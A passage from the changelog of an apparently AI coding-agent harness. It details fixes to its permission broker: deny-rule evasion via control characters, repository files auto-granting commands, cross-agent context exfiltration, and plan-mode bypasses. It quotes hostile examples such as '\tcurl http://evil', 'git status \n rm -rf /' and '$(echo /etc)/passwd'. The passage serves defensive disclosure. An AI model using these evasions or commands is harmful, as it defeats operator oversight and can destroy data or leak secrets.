  revoke. (`crates/conway-runtime/src/permission.rs`,
  `crates/conway/src/conway.rs`, `crates/conway-cli/src/tui/`)

### Security

- **`deny` rules were evadable with a single leading tab (or newline/CR/
  escape) — the v0.5.0 sanitizer-laundering bug class, reintroduced on the
  `deny` side.** `deny bash:curl` was meant to refuse any `curl` invocation
  regardless of chaining, but `rendered` reaches `PatternRule::matches_deny`
  already passed through `sanitize_rendered` (every control character
  rewritten to `U+FFFD`), and that placeholder is not Unicode whitespace —
  so `\tcurl http://evil` sanitized to `\u{FFFD}curl http://evil`, one
  fused token that a bare prefix comparison could not align with the rule's
  `curl` prefix. In Prompt mode this silently DEGRADED a hard deny into a
  prompt the operator could accept; in `AutoAllow` mode (which never
  consults the gate) it was a FULL, SILENT BYPASS. Fixed by having
  `matches_deny` treat a `rendered` string carrying a raw control character
  or the sanitizer's placeholder as matching any deny rule for that tool —
  failing TOWARD the deny rather than trusting a tokenization that string
  cannot be trusted to produce — deliberately narrower than the
  metacharacter set itself, so the module's own documented prefix-match
  limit (`deny bash:git push` still does not catch `foo; git push`) is
  untouched. `deny` continues to match against `rendered`, not `arguments`
  (`.design/extension-architecture.md` §5.3's "not the basis of a
  security decision" caution is about trusting `rendered` blindly, which
  this fix specifically stops doing, not about reading it at all —
  `arguments` has no tool-agnostic way to extract "the command string" the
  way `rendered` does); `AutoAllow` already consulted `deny` before this
  fix and continues to (that mode has no gate behind a miss, which is by
  design). (`crates/conway-core/src/permission_pattern.rs`,
  `crates/conway-runtime/src/permission.rs`,
  `crates/conway-runtime/tests/permission_broker.rs`,
  `crates/conway/tests/permission_deny_laundering_seam.rs`)

- **CRITICAL: a cloned repository's `.conway/permissions.json` auto-granted
  pattern permissions at startup with no consent.** The file's `allow` list
  was installed at `PermissionScope::Session` — covering every requester —
  the moment the TUI started, with no prompt, no diff, and no record of
  where a rule came from. A repository shipping
  `{"allow": ["bash:npm run build"]}` (or `bash:make`, or `bash:cargo test`)
  therefore auto-approved that command on first launch, in a repo that also
  controls the file the command runs (`package.json`, `Makefile`,
  `build.rs`) — arbitrary code execution from a `git clone`, no keystroke
  required. **Anyone who has cloned and opened untrusted repositories in
  conway should upgrade and review `~/.conway/permissions.json` /
  `<project>/.conway/permissions.json` for rules they did not knowingly
  add.**

  Fixed by requiring an explicit, content-scoped trust decision before a
  PROJECT-scoped file's `allow` rules install at all:

  - `PermissionFile` gains a `deny` half (`#[serde(default)]`, so every
    existing file keeps parsing). `deny` rules apply **immediately, from
    any file, trusted or not** — narrowing what is authorized has no
    failure mode worth gating, so a safety rule works the moment it is
    written. `allow` rules from a project file install **only** once
    `conway::config::trust::TrustStore` confirms a recorded trust decision
    matching the file's exact current bytes; the operator's own global
    file (`<xdg>/permissions.json`) is unaffected — trusted by authorship,
    no new friction.
  - Trust is per-`(absolute path, blake3 content digest)`, never a
    directory: editing a trusted file's content **silently de-trusts it**
    (no modal, ever — a prompt firing on every `git pull` would train an
    operator to press "yes" without reading it, which is worse than no
    prompt at all). The only path that writes a trust record is the new
    `/trust permissions` TUI command, an explicit operator action that also
    installs the file's rules immediately for the running session.
    `trust.json` (global-only — a project-scoped trust file would let
    untrusted content trust itself) is refused if group- or
    world-writable on unix (the same posture `ssh` takes with a loose
    private key), and every failure mode (missing, corrupt, unreadable,
    a digest mismatch) fails closed to "untrusted," never "trusted."
  - `deny` matching (`PatternRule::matches_deny`) deliberately does **not**
    consult the shell-metacharacter gate `allow` matching still applies
    (`PatternRule::matches_render`) — inverted, that gate would let adding
    a `;` to a command defeat the very deny rule meant to catch it. Stated
    honestly: **`deny bash:git push` does not catch `foo; git push`** —
    prefix matching is not a containment boundary in either direction, and
    a `deny` rule is a seatbelt for the obvious case, not one. What keeps
    the composition sound is `allow`'s own gate: a command carrying a
    metacharacter can never be satisfied by a **pattern grant**, regardless
    of what patterns exist. (Corrected 2026-08-04: this sentence originally ended "so a chained
    command always reaches the operator either way," which was false and
    contradicted this same release's own entries above — the gate governs
    pattern matching only, and `AutoAllow` short-circuits to allow *after*
    it and *before* the operator's gate. Under `AutoAllow`, with no
    `deny`/`prompt` rule and no confinement root, a chained command runs
    silently. The shipped behavior described by this entry is unchanged;
    only the claim about it is.)
  - Every installed pattern grant now carries its origin
    (`PatternOrigin::Interactive` or `PatternOrigin::File(path)`), shown in
    `/settings`'s grant list (`[interactive] ...` / `[/path/to/file] ...`)
    — a rule set nobody can attribute to its source is a trap.

  Design: `.design/d4-trust-model.md` §3–5, §11. This ships the
  narrower, non-plugin half of that design (one trust subject kind,
  `permission_file`, keyed directly on absolute path rather than nested
  under a `projects` map with a `kind` tag) — the two load-bearing
  properties (per-file granularity, digest-not-directory) are already
  exactly what the full design specifies, and a `plugin` kind can be added
  to `trust.json` later without redesigning this. Root confinement (v0.6.0)
  is unaffected — it is checked above every allow path, including this one.
  (`crates/conway-core/src/permission_pattern.rs`,
  `crates/conway-runtime/src/permission.rs`,
  `crates/conway/src/conway.rs`, `crates/conway/src/config/trust.rs`,
  `crates/conway-cli/src/tui/app.rs`)

- **Any agent could steer, await, or cancel any other agent, with no check
  that the caller was even related to the target.** `SubagentHost::steer`/
  `await_result`/`cancel` took only a `target` id — reachable via `conway_steer`/
  `conway_await`/`conway_cancel` with a MODEL-supplied `agent_id` string, no
  ownership check at either the tool or the trait layer — so a sibling agent
  (or anyone who had merely seen an id, e.g. in tool output or the event
  stream) could cancel another branch's work or inject a `steer` message
  that landed with forged parent authority (`steer` attributed the message
  to `target`'s own tree parent, never the actual caller). Fixed by adding a
  `caller: AgentId` parameter to all three trait methods and enforcing, AT
  THE TRAIT BOUNDARY, that `caller` must be `target` itself or one of its
  ancestors (`RuntimeError::AgentNotInSubtree` otherwise); `steer`'s
  attribution now derives from `caller` directly. No separate "operator"
  bypass exists — `conway::SessionHandle` (the TUI/embedder path) passes its
  own session root as `caller`, which already covers its whole session by
  construction. (`crates/conway-core/src/ports/subagent.rs`,
  `crates/conway-core/src/error.rs`, `crates/conway-runtime/src/subagent.rs`,
  `crates/conway-tools/src/subagent/`, `crates/conway/src/session_handle.rs`)

- **Cross-tree exfiltration in one call: the fix above covered three of six
  `SubagentHost` methods, leaving `start`, `ask`, and `tree` unguarded.**
  `tree()` took no caller at all and returned the WHOLE runtime tree to any
  tool holding `ToolCtx::subagents` (built-in or third-party); `start`/`ask`
  took only `parent` and acted on it directly, with no check that the caller
  was entitled to attach or fork there. Composed, any tool could call
  `tree()` to discover a sibling's `AgentId`, then `ask(sibling,
  SubagentSpec { mode: Fork, .. })` to fork that sibling's ENTIRE context
  (a fork inherits everything up to the fork point) and read the reply back
  as plain model output — the design's own named worst case, executable via
  a single tool call. Fixed with the SAME mechanism as above, not a second
  one: `start`/`ask` gain a `caller: AgentId` parameter and enforce, AT THE
  TRAIT BOUNDARY, that `caller` must own `parent` (`ensure_own_subtree`,
  reused verbatim — `ask` composes `start`, so it performs no separate check
  of its own); `tree` gains `caller: AgentId` and returns exactly that
  caller's own subtree, never a foreign branch (for the session root this is
  the whole tree, correctly — the root's subtree IS the tree). No new bypass
  flag: `conway::SessionHandle::fork`/`spawn` pass `self.root` as `caller`,
  mirroring the existing root/operator exemption exactly, and the
  model-invoked `conway_subagent`/`conway_ask` tools pass `ToolCtx::agent_id`
  as both `caller` and `parent` (a tool call always starts/asks a child of
  the calling agent itself; neither tool's JSON schema names a different
  parent). (`crates/conway-core/src/ports/subagent.rs`,
  `crates/conway-core/src/error.rs`, `crates/conway-core/src/fakes.rs`,
  `crates/conway-runtime/src/subagent.rs`, `crates/conway-tools/src/subagent/`,
  `crates/conway-tools/src/testing.rs`, `crates/conway/src/session_handle.rs`,
  `crates/conway/src/intent.rs`, `crates/conway-runtime/tests/subagent_fork_spawn.rs`,
  `crates/conway/tests/subagent_exfiltration_seam.rs`)

- **A plugin-contributed `prompt` rule — the extension design's own flagship
  worked example (`.design/extension-architecture.md`'s
  `{"categories":["edit","delete"],"then":"prompt"}`) — was inert in EVERY
  mode.** `must_reach_gate` (the mechanism that forces a call past the
  cache/pattern-grant/`AutoAllow` shortcuts to the operator's real gate) was
  set exclusively by `PermissionBroker::check_root`; nothing else could
  raise it, so a guardrail plugin's `prompt` rule had no effect no matter
  what matched. Concretely: under `AutoAllow`, nothing could force the gate
  at all, so the mode where a guardrail matters most is the one it did
  nothing in; under `Prompt` mode, an operator's own pattern ALLOW grant
  resolved a matching call before any `prompt` rule could be consulted,
  silently defeating a plugin's narrower rule for the identical call.
  `must_reach_gate` is now a broker-level accumulator any narrowing source
  can raise, never lower: `check_root`'s own root-forced case is unaffected
  (still pinned by
  `unconfinable_bash_command_always_reaches_the_gate_for_a_confined_root_agent`),
  and a new `prompt_patterns` set (structurally identical to the existing
  `deny_patterns` — no `GrantScope`, matched via `PatternRule::matches_deny`
  so a chained command cannot evade the extra scrutiny the way it evades an
  `allow`) ORs onto it. The step is checked above the cache, so it beats a
  cached `AllowAlways`, a matching pattern grant, and `AutoAllow` alike —
  deliberately: a plugin's `prompt` rule is a claim that a class of call
  deserves a human look every time, and letting a `deny`-adjacent narrowing
  rule sit below any allow path would repeat the exact bug class this fix
  closes. `deny` still beats `prompt` beats `allow` (a call matching both a
  `deny` rule and a `prompt` rule is refused outright, never merely
  escalated to an ask), and registration order remains unobservable.
  Attribution is a deliberate non-goal of this fix: the operator sees the
  forced ask through the ordinary `gate.check` path, with no marker
  distinguishing "a rule forced this" from an ordinary first-time ask —
  `PermissionDecisionKind` is not extended, because the forced path always
  resolves through the REAL gate and reports its REAL decision, never
  `Cached`, so there is no risk of a new cause being mislabeled the way this
  item's own acceptance criteria warn against; surfacing WHICH rule forced
  the ask in the prompt UI needs a wire-visible field on `PermissionRequest`
  and is left as a follow-up. (`crates/conway-runtime/src/permission.rs`,
  `crates/conway-runtime/tests/permission_broker.rs`,
  `crates/conway/src/conway.rs`, `crates/conway/tests/permission_prompt_seam.rs`)

### Fixed

- **conway never emitted `cache_control` — Anthropic prompt caching was off
  in production.** `ContextBuilder::build` runs before routing resolves a
  model, so every root/fork/spawn call site hardcoded `CacheMode::None`
  (a pre-routing placeholder) and no `PromptSegment` ever carried a
  `cache_hint`, so `apply_cache_hints` (the only writer of `cache_control`
  in the workspace) always had an empty candidate list — every Anthropic
  turn paid full input price for the whole (never-compacted) transcript.
  `AttemptEngine::execute` now attaches cache hints as a post-routing pass,
  once per candidate route, keyed on that route's ACTUALLY resolved
  `Backend::capabilities(&route.model).cache` — never a caller-supplied
  setting, so this is on by default for every Anthropic model without any
  opt-in, root or forked/spawned child alike. Breakpoint indices are
  re-derived from the final segment list's provenance
  (`context::builder::breakpoint_indices`), not threaded from `build` time,
  so a `ContextHook`-transformed request still gets correct placement.
  OpenAI-compatible/implicit-prefix backends are unaffected: `cache_hint` is
  read by exactly one module in the workspace
  (`conway_backends::anthropic::cache`); everything else ignores it, proven
  by an existing test. A hint is never correctness-bearing, and that
  holds and is tested; a new end-to-end test drives a real `Runtime::start_root`
  and a forked child through an Anthropic-capability route and asserts the
  `GenerateRequest` actually handed to `Backend::generate` carries a
  breakpoint — the class of test whose absence let this, `read:*` pattern
  grants, and `Plugin::on_init` all ship inert.
  (`crates/conway-runtime/src/attempt.rs`,
  `crates/conway-runtime/src/context/builder.rs`,
  `crates/conway-runtime/src/runtime.rs`,
  `crates/conway-runtime/src/subagent.rs`,
  `crates/conway-runtime/tests/prompt_cache_e2e.rs`)

- **Pattern grants were still inert for every tool except `bash`.** v0.5.0
  fixed `Tool::render` for `bash` alone (`PatternRule::matches`'s
  metacharacter gate rejects `(`/`)`/`{`/`}` on sight, and every OTHER
  built-in's rendering is still the trait's default JSON dump, which always
  carries them) — so `read:*`, `write:*`, `edit:*`, `grep:*`, `glob:*`,
  `cd:*`, `report:*`, and every subagent tool's wildcard matched nothing,
  ever. The gate is meaningful only for a rendering a shell would actually
  interpret; a JSON dump is never handed to one. Tools now declare that
  distinction themselves via a new `conway_core::ports::Tool::render_kind`
  (`RenderKind::ShellCommand` vs. `RenderKind::Structured`), deliberately
  SEPARATE from the existing `Tool::path_args` (`report` needs both
  answered independently: `PathArgs::Unconfinable` for root-confinement
  purposes, `RenderKind::Structured` for pattern-grant purposes — reusing
  `path_args` would have left `report:*` permanently inert for a reason
  unrelated to why the gate exists). `PatternRule::matches_render` consults
  it; only `bash` declares `ShellCommand`, so `git status && rm -rf /`
  still re-prompts exactly as before, while `read:*` and the other eleven
  non-`bash` wildcards now actually grant. The default is the conservative
  `ShellCommand`, so an undeclared third-party tool stays exactly as gated
  as it was before this method existed — never silently exempted. A
  registry-wide test (`conway-tools/tests/builtins.rs`) enforces that a
  tool may only claim `Structured` while its rendering is byte-identical to
  the trait's own default, so a future tool that overrides `render` to
  emit something shell-interpretable cannot silently defeat the gate by
  omission. (`crates/conway-core/src/permission_pattern.rs`,
  `crates/conway-core/src/ports/plugin.rs`,
  `crates/conway-runtime/src/permission.rs`,
  `crates/conway-runtime/src/tools/runner.rs`, `crates/conway-tools/src/`)

- **A fatal runtime error rendered as an ordinary cyan notice in the TUI,
  indistinguishable from routine chatter like "backend degraded" save for
  the word "fatal" inside the text.** `Event::Error` now pushes its own
  `Entry::Error { text, fatal }` transcript entry instead of `Entry::Notice`:
  `fatal: true` renders in `theme.fatal_error` (red + bold), `fatal: false`
  renders in `theme.error` (red, one severity step down) — both visibly
  distinct from `theme.notice`'s cyan, matching the palette's "red means
  failure" rule. (`crates/conway-cli/src/tui/state.rs`,
  `crates/conway-cli/src/tui/view/transcript.rs`)

- **Focusing an agent mid-conversation showed a lie: `ctx 0%` and no model,
  even when that agent had already run a turn.** `focus_agent` zeroed
  `focused_model`/`focused_model_max_context`/`focused_ctx_tokens` on every
  switch, and replay never repopulated them (`record_to_event` maps a
  replayed `Assistant` record to `TextDelta`, never to `ModelDecision` or
  `ContextSegmentAdded`) — the true figures only reappeared once the newly
  focused agent produced its own next *live* turn. `App::try_focus_agent`
  now re-fetches both authoritatively right after switching focus, the same
  way it already did for `focused_agent_usage`: the serving model via the
  new `SessionHandle::last_model` (the last `LogRecord::Assistant` in the
  agent's own log), and the context total via the new
  `SessionHandle::context_report_current`, which also closes a second,
  related gap — a session resumed from a prior process has an empty live
  context report in this one, so this method falls back to the most
  recently *persisted* report rather than silently showing 0.
  (`crates/conway/src/session_handle.rs`, `crates/conway-runtime/src/runtime.rs`,
  `crates/conway-cli/src/tui/app.rs`, `crates/conway-cli/src/tui/commands.rs`,
  `crates/conway-cli/src/tui/state.rs`)

- **The TUI re-read and re-parsed `models.metadata_path` from disk a
  second time at startup, independently of the facade's own load** — two
  code paths that agreed only because both happened to implement the
  identical "missing file → empty map" fallback. `App::new` now reads the
  new `Conway::model_metadata()` accessor instead, which exposes the exact
  map `ConwayBuilder::build` already loaded to construct the
  `CapabilityIndex` — one load, one source of truth.
  (`crates/conway/src/conway.rs`, `crates/conway/src/builder.rs`,
  `crates/conway-cli/src/tui/app.rs`)

### Removed

- **`Plugin::on_init` and `PluginInitCtx` are gone** — an API narrowing. The
  trait documented `on_init` as "called once at startup"; nothing ever called
  it. A third-party plugin implementing it to open a connection, load config,
  or validate credentials got silently skipped code, with no error and no
  warning. An absent hook is a known limitation; an unwired one is a trap,
  which is why this was removed rather than left in place.

  Removal over wiring it up, deliberately: `PluginRegistry::from_plugins` is
  synchronous and eager and `Plugin::manifest()`/`tools()` are sync and
  infallible, so there is no coherent point at which an async or fallible
  `on_init` could run without reshaping plugin construction. No built-in
  implemented it, and built-ins use the same surface third
  parties do — a hook with no customer is surface without a purpose.
  Anything a plugin needs at construction it does in its own constructor
  before `with_plugin`. The method was defaulted, so no in-tree implementor
  breaks. (`crates/conway-core/src/ports/plugin.rs`)

## [0.6.0] — 2026-07-30

### Overview

Agents are now cwd-aware, along two deliberately separate axes — the split
Unix draws between `chdir` (where a process *is*) and `chroot` (what it can
*reach*). An agent can move itself with the new `cd` tool; a parent can
confine a spawned child to a filesystem **root** it can narrow but never
widen. Conflating the two is the mistake this design exists to avoid: cwd
was never the security boundary, which is exactly why moving around freely
is safe once confinement lives somewhere else.

Confinement is enforced in the permission broker, above every path that can
return an allow — the grant cache, pattern grants, and `AutoAllow` alike —
so nothing in the grant vocabulary can express or widen a root. That
matters because `.conway/permissions.json` is discovered from the project
directory, which means **a repository you clone ships one**.

**Read the limits before relying on this.** A root confines the path
*arguments* of path-taking tools. It does not confine what a shell command
does: `bash`'s `cwd` argument is checked, but its command string runs
verbatim and the broker cannot parse shell. **An agent holding `bash` is not
confined by root alone** — the composition that is a real guarantee is a
root *plus* a tool set excluding `bash`. There is also an unclosed TOCTOU
window between the broker's check and the tool's open. Both limits are
documented in full in `docs/crates/conway-runtime.md` and `ARCHITECTURE.md`
§3.4, and neither is softened there.

### Added

- **`SpawnSpec::root` — a spawned child's confinement root is now first-class
  plumbing, carried and validated end-to-end (S3: root plumbing).** This
  slice adds the `root` field and enforces the inheritance algebra at spawn
  time; it does **not** yet check any tool call against it (a later slice
  wires that enforcement). `conway_core::agent::SubagentSpec` gains
  `root: Option<PathBuf>` beside `cwd` (`#[serde(default)]`, so a persisted
  spec written before this field existed still deserializes to `None`);
  `conway_core::log::SessionMeta` gains the matching `root: Option<PathBuf>`
  (also `#[serde(default)]`) so a resumed session's confinement survives a
  store round-trip — persisting it only in memory would make a resumed
  session silently unconfined. `conway-runtime`'s `SubagentHost::start`
  resolves the effective root ONCE, alongside `child_cwd`, using
  `conway_core::containment::CanonicalRoot`: `root: None` inherits the
  parent's root unchanged (including staying unconfined); `Some(requested)`
  is canonicalized and checked against the parent's own root — a narrower
  (or equal) requested root is accepted, but a root that is WIDER than, or
  disjoint (sideways) from, the parent's own root FAILS THE SPAWN with a
  typed error naming both roots, never silently clamped to the parent's
  root (the same bug shape 0.5.0 fixed for pattern grants). The child's
  `cwd` (inherited or overridden) must also resolve inside its own `root`,
  or the spawn fails; a root that does not canonicalize also fails the
  spawn. A grandchild spawned with `root: None` inherits its IMMEDIATE
  parent's (possibly-narrowed) root, not the root agent's own. `resume_root`
  carries no `root` override at all (so it can neither widen nor null a
  session's persisted root), but its `cwd` override IS checked against the
  persisted root.

  Exposed on the facade as `SpawnSpec::root(path)` (`conway/subagent_spec.rs`)
  only — deliberately not on `ForkSpec`, for the same reason `cwd` isn't: a
  fork inherits the forker's ENTIRE context. The model-invoked
  `conway_subagent`/`conway_ask` tools gain no equivalent argument
  (embedder-only for this slice, exactly as `cwd` already is). See
  `docs/crates/conway.md`'s `SpawnSpec` section for the full semantics.

- **`cd` — a built-in tool that changes the model's working directory
  (S2: the `cd` tool).** `conway-tools`' `FsPlugin` gains a sixth tool,
  `cd` (category `Move`, permission `Safe`), the first caller of S1's
  `ToolCtx::chdir: CwdHandle` capability. It resolves its `path` argument
  the same way every other file tool does, verifies the target exists and
  is a directory *before* calling `chdir.set` (a nonexistent path or a
  file target is a model-recoverable error, cwd left unchanged), and
  names the new cwd in its output (the model's only confirmation the move
  happened, given the next-batch semantics below). Built entirely on the
  public `ToolCtx` surface, so it demonstrates by construction, not by
  assertion, that a built-in gets no surface a third party lacks. Because
  `ToolRunner::run_batch` snapshots `chdir`
  into `ToolCtx::cwd` once per batch (S1), **a `cd` takes effect starting
  the next batch, not the one it was issued in** — documented in the
  tool's own description (the model reads that, not crate docs), along
  with the per-call `cwd` argument on `bash`/`glob`/`grep` as the
  immediate one-off alternative. `cd -`, `pushd`/`popd`, a directory
  stack, `PATH`-style search, and a `pwd` tool are deliberately out of
  scope — shell affordances a model with absolute paths doesn't need.
  `cd` contains no root-specific code, but its target **is** nonetheless
  confined: it declares `PathArgs::Named(&["path"])`, and the broker's root
  check (below) evaluates every declared path argument of every tool, so a
  `cd` outside a confined agent's root is denied before any allow path is
  consulted — the same treatment `read`/`write` get, from the same generic
  mechanism. Moving around *within* the root is unremarkable, since cwd was
  never the boundary; an unconfined agent is unaffected. See
  `docs/crates/conway-tools.md`'s `FsPlugin` section for the full semantics.

- **`PermissionBroker` now enforces an agent's confinement root against
  every tool call (S5: the broker root check).** S3 landed the plumbing
  (`SessionMeta.root`/`SubagentSpec.root`) with no enforcement yet; this
  slice is the enforcement. The check runs FIRST in `PermissionBroker::
  decide` — above the plan-mode gate, the `AllowAlways` cache, pattern
  grants, and `AutoAllow` mode alike — so none of them can widen, satisfy,
  or bypass a confined agent's root; a repository-shipped
  `.conway/permissions.json` pattern grant cannot defeat it either. It
  reads each call's raw `arguments` (never the display-sanitized
  `rendered` string — reading `rendered` here would reintroduce the exact
  fail-open bug class 0.5.0 fixed) against the tool's own declared
  `Tool::path_args`: a `Named` path resolved outside the root (via
  `conway_core::containment::CanonicalRoot`, so a symlink escape or `..`
  is caught, not just a lexical prefix) is denied outright; an
  `Unconfinable` call (e.g. `bash`'s free-form command) is never
  auto-allowed under a root — it always reaches the operator's gate
  instead, though any of its own `checkable` arguments (`bash`'s `cwd`)
  are still enforced the same way `Named` paths are. An agent with no
  root is entirely unaffected (this remains the default: only a spawned
  child with an explicit `SpawnSpec::root` is ever confined). A root that
  no longer canonicalizes when reconstructed (e.g. its directory was
  removed) fails closed — every root-relevant call is denied, never
  silently unconfined. (`crates/conway-runtime/src/permission.rs`,
  `crates/conway-runtime/src/tools/runner.rs`,
  `crates/conway-runtime/src/agent_loop.rs`)

- **Documented the confinement root's honest enforcement boundary, and
  pinned bash's `cwd` acceptance cases with a seam test (S6: the final
  slice of the cwd/root confinement cycle).** Part 1 (root-checking
  `bash`'s `cwd`) landed with S5; this slice adds the missing
  in-root-is-allowed case (`bash_cwd_inside_root_is_allowed`,
  `crates/conway/tests/root_containment_seam.rs`) alongside the
  already-passing outside-is-denied and no-`cwd`-reaches-the-gate cases, so
  all three of the item's acceptance shapes are pinned by a real
  `ToolRunner`/`PermissionBroker` seam test, not just asserted. The rest of
  the slice is documentation, stated as limits rather than reassurance: a
  root confines the path arguments of path-taking tools, not what a shell
  command does (`bash`'s `command` string is declared unconfinable, not
  enforced — an agent holding `bash` is not confined by root alone); the
  composition that IS a real guarantee is root plus a tool set that
  excludes `bash` (`SubagentSpec.tools`/`ToolSelector`, already-existing
  machinery — no new mechanism); and the check has a TOCTOU limit (checked
  in the broker, opened later inside the tool, across a task boundary — a
  symlink created inside the root in between defeats it, closeable only by
  tool-layer `openat`/`O_NOFOLLOW` sandboxing, out of scope here). Recorded
  in `docs/crates/conway-tools.md` (`ShellPlugin` section), `docs/crates/
  conway-runtime.md` (a new "The honest boundary" subsection under
  "Permission brokering"), `ARCHITECTURE.md` §3.4, and `BashTool::
  path_args`'s own doc comment plus its `ToolSpec::description` (`crates/
  conway-tools/src/shell/bash.rs`) — including the explicit "do not parse
  the command string" reasoning (`cd ..`, `$HOME/x`, `$(echo /etc)/passwd`,
  `exec 3</etc/passwd`, a shell function, a heredoc all defeat any such
  scan) at the one place a future contributor is most likely to consider
  "improving" this. Also fixed two now-stale doc claims found while writing
  this: `docs/crates/conway-tools.md` said path confinement was "the
  `PermissionGate` implementation's job", predating S5's broker-level
  enforcement; `docs/crates/conway.md`'s `SpawnSpec.root` section still said
  "nothing checks a tool call's arguments against `root`" — true when S3
  landed the plumbing, false since S5 wired the actual check. Both
  corrected to describe current behavior.

### Security

- **Plan mode could be talked out of its denial by a cached `AllowAlways`
  grant — a real fail-open that SHIPPED in 0.5.0, and the strongest reason
  to upgrade from it.** `PermissionBroker::decide`'s mode-gate comment
  claimed plan mode's denial was checked "before any allow path", but the
  cached-grant check returned `Allow` sixteen lines above it: a call
  granted `AllowAlways` under `Prompt` (or any other mode), then re-issued
  byte-identically after the operator switched to `Plan`, was still
  silently allowed — in the mode an operator selects precisely to get a
  guarantee. Bounded, since the cache key is tool plus an arguments digest
  and only the byte-identical call slipped through, but plan mode's whole
  value is being trustworthy. The plan-mode denial check now runs first,
  ahead of the cache, pattern grants, and `AutoAllow` alike, so the
  guarantee holds against every allow path, not just two of the three.
  Worth the contrast with 0.5.0's pattern-grant pair: those were
  fail-*closed* in every release, and the sanitizer-laundering fail-open
  fixed alongside them was introduced and fixed within a single unreleased
  commit and never shipped (see the corrected 0.5.0 **Security** note).
  This one did ship — in 0.5.0 — and is fixed here.
  (`crates/conway-runtime/src/permission.rs`,
  `crates/conway-runtime/tests/permission_broker.rs`)

## [0.5.0] — 2026-07-29

### Security

Two defects in the permission layer's pattern-grant path are fixed in this
release. **Correction (2026-08-01):** this note originally described the
second defect as exposure a 0.4.0 user was carrying, and urged an upgrade
on that basis. That was wrong, and the accurate statement is:

- **Pattern grants never functioned in any release up to and including
  0.4.0.** `PermissionRequest::rendered` was always a generic
  `name({...})` form, which the metacharacter gate rejects on sight, so no
  persisted rule ever matched and `[p]` never appeared. The failure was
  fail-*closed* — over-prompting, never over-permitting. **No released
  version was ever fail-open on this path.**
- The fail-open half — the display sanitizer laundering the
  shell-metacharacter gate, so a newline-chained command
  (`git status \n rm -rf /`) would be auto-approved against an existing
  `bash:git status` grant while the shell executed the raw newline — was
  **introduced and fixed within the same unreleased commit** (`d3ba8ec`,
  which added both the rendered-path sanitizer and the gate hardening
  against it). At 0.4.0 there was no sanitizer in the rendered path at all,
  and no commit in the 0.4.0..0.5.0 range made the fail-open reachable.
  **It never shipped.**
- What 0.5.0 actually changes: pattern grants now work — **for `bash`
  only** in this release. Every other tool still renders the gated JSON
  form, so its grants stay inert (fixed for the remaining tools in 0.7.0).

Full detail on both defects, including the tests that pin them, in the two
`CRITICAL` entries under **Fixed** below.

### Fixed

- **CRITICAL: pattern grants were completely inert.** No persisted
  `permissions.json` rule could ever match a tool call, for any tool, with
  any arguments, and `[p]` never appeared on a permission prompt.
  `PermissionRequest::rendered` was always synthesized as a generic
  `name(args)` one-liner — for `bash`, `bash({"command":"git status"})` —
  and `PatternRule`'s metacharacter gate (a hard, deliberate safety check
  that rejects `(){}` among other shell metacharacters) rejected that JSON
  syntax on sight, before any prefix comparison. The failure direction was
  safe (over-conservative, never over-granting) but the feature did
  nothing. `conway_core::ports::Tool` now has a `render(&self, args:
  &Value) -> String` method — defaulting to the old generic rendering (so
  every existing third-party `Tool` implementation, via
  `ConwayBuilder::with_plugin`, keeps compiling unmodified) and overridden
  by the built-in `bash` tool to return the bare command string instead.
  **In this release that is the only override:** pattern grants become live
  for `bash` alone, and every other built-in tool keeps the default
  JSON-dump rendering, trips the same metacharacter gate, and stays inert
  (`read:*` and the other non-`bash` wildcards matched nothing until 0.7.0,
  which introduced `Tool::render_kind` and lifted the gate for
  structured renderings).
  `conway-runtime`'s tool runner now calls the resolved tool's own
  `render` (rather than synthesizing a generic form itself) and sanitizes
  the result — untrusted, model-supplied arguments are replaced
  character-for-character wherever they carry a Unicode control byte (e.g.
  an ANSI escape sequence), so a rendered call can never smuggle terminal
  control codes into the permission prompt. A chained or substituted
  command (`git status && rm -rf /`) still re-prompts every time, now
  proven against the real production rendering path rather than a
  hand-written test fixture.

- **CRITICAL: the metacharacter gate could be laundered by the display
  sanitizer.** Found while reviewing the fix above, and fixed with it —
  **it was never released.** The sanitizer it exploits entered the tree in
  the same commit as this hardening (`d3ba8ec`), so the vulnerable ordering
  existed only inside that one unreleased commit: at 0.4.0 there was no
  sanitizer in the rendered path, and grants were inert anyway. That
  sanitizer runs *before* the gate, and `\n`
  and `\r` are simultaneously Unicode control characters *and* two of the
  gate's own shell metacharacters. Sanitizing therefore destroyed the very
  evidence the gate looks for: `git status \n rm -rf /` arrived as
  `git status <U+FFFD> rm -rf /`, the gate saw nothing wrong, and the
  replacement character was consumed as its own whitespace-delimited token
  by the token-wise prefix comparison — so an existing `bash:git status`
  grant would have **silently auto-approved a newline-chained command**,
  while the shell executed the raw, unsanitized newline for real. Note the
  failure direction: unlike the inert-grants bug above, this one was
  fail-*open*. `contains_shell_metacharacters` is now hardened at the
  security boundary itself rather than at the sanitizer, so it holds
  regardless of what any caller did to the string upstream: it rejects the
  shell metacharacters, *any* control character (catching an unsanitized
  string), and the sanitizer's `U+FFFD` placeholder (catching a sanitized
  one). Covered by a unit test pinning both the raw and sanitized forms
  across six spacing variants, and by an end-to-end test driving the real
  `BashTool` → tool-runner → permission-broker pipeline, which cannot
  drift from the real sanitizer because it runs it.

- **`SubagentHost::ask`'s fork-only invariant was only a
  `debug_assert!`, which compiles to nothing in release builds** —
  every binary a user runs. In today's tree the only callers
  (`conway_ask`, `conway::SessionHandle::ask`) always construct a `Fork`
  spec, so this was a latent gap, not a live one, but a `SubagentHost`
  is a trait boundary any caller can reach, and an out-of-process
  plugin supplying JSON is not a trusted in-process Rust type. `ask`
  now returns a typed `RuntimeError::AskRequiresFork { mode }` for any
  non-`Fork` spec, enforced in every build, not just debug — matching
  the requirement that mode restrictions on a primitive are enforced
  at the trait boundary, and that a malformed
  request is a typed error, never a panic. Fork-mode `ask` behavior is
  unchanged.

- **The status line's `AUTO-ALLOW` indicator could be silently disabled by
  config.** The width-degradation ladder guaranteed `mode` survives WIDTH
  pressure, but nothing required `mode` to be in the resolved `[tui.
  status_line] fields` list in the first place — a `fields` config that
  simply never named `mode` (a hand-pinned `settings.json`, or
  `CONWAY_TUI__STATUS_LINE__FIELDS` set without it) rendered the line with
  no safety indicator at all, at any width, permanently. `mode` is now
  forced into the resolved field list whenever the active permission mode
  is non-default (`plan`/`AutoAllow`) even when the configured `fields`
  omits it — not user-disableable, and reached uniformly from every config
  source (file or env). It stays out while `Prompt` (the default) is
  active, so a `fields` list that genuinely doesn't want `mode` keeps
  rendering exactly as configured.

- **The status line's width-fit arithmetic counted characters, not
  rendered columns.** A CJK character or emoji is one `char` but two
  terminal columns, and the line's own fields are not ASCII-restricted
  (`lineage`'s `@{agent_def}` hop names are arbitrary user-chosen text) —
  the arithmetic could be wrong by up to 2x, and since `lineage` sits
